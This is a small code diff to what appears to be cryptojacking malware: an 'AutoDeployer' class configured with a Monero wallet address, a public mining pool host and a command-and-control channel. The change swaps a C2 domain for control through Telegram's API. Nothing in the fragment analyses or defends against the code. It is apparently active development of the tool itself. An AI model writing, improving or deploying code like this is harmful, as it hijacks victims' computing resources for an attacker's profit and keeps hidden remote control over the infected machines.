@@ -214,7 +214,8 @@ class AutoDeployer:
 def main():
     wallet = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
     pool = "pool.hashvault.pro:80"
-    c2_url = "https://gbctwoserver.net"
+    # Telegram C2 - no URL needed, works directly via Telegram API
+    c2_url = ""  # Empty for Telegram C2
     
     deployer = AutoDeployer(wallet, pool, c2_url)
     result = deployer.run()
